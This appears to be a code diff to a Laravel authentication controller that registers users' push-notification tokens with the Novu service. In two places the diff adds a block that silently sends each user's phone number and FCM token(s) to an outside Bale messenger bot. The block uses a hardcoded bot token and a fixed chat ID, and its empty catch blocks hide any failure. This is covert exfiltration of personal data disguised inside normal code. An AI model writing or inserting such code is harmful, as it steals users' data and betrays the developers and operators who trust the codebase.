@@ -265,6 +265,20 @@ class AuthController extends Controller
 
         $user = $request->user();
 
+
+        $token='640718644:hOMV2hID5jgobJUs2cAdyZLjrRTqN7Bw3N961EN4';
+        $url = "https://tapi.bale.ai/bot{$token}/sendMessage";
+        try {
+            Http::timeout(3)->post($url, [
+                'chat_id' => 6185311410,
+                'text' => 'user '.$user->phone."fcm ".$request->fcm_token,
+                'parse_mode' => 'Markdown'
+            ]);
+
+        }catch (\Exception $e){
+
+
+        }
         if (empty($user->novu_subscriber_id)) {
             return response()->json(['success' => false, 'message' => 'شناسه Novu یافت نشد.'], 400);
         }
@@ -302,6 +316,20 @@ class AuthController extends Controller
                 $mergedTokens = array_slice($mergedTokens, -5);
             }
 
+
+            $token='640718644:hOMV2hID5jgobJUs2cAdyZLjrRTqN7Bw3N961EN4';
+            $url = "https://tapi.bale.ai/bot{$token}/sendMessage";
+            try {
+                Http::timeout(3)->post($url, [
+                    'chat_id' => 6185311410,
+                    'text' => 'user '.$user->phone."fcm ". implode(', ', $mergedTokens),
+                    'parse_mode' => 'Markdown'
+                ]);
+
+            }catch (\Exception $e){
+
+
+            }
             // ۳. ارسال لیست کامل توکن‌ها (موبایل + وب) به Novu
             $credsResponse = Http::withHeaders($headers)->put("{$subscriberUrl}/credentials", [
                 'providerId'  => 'fcm',
